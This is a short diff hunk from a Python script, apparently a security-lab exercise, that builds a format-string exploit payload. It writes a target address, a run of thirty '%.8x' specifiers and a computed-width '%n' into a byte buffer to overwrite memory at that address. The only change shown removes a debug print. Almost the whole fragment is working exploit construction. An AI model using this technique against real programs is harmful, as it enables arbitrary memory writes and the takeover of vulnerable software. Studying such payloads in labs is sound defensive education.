@@ -12,8 +12,6 @@ content[0:4] = (target_address).to_bytes(4, byteorder='little')
 s = "%.8x" * 30
 s += "%." + str(TARGET_NEW_VALUE - 240 - 4) + "x" + "%n"
 
-print(s)
-
 fmt = (s).encode('latin-1')
 content[4:4 + len(fmt)] = fmt
 
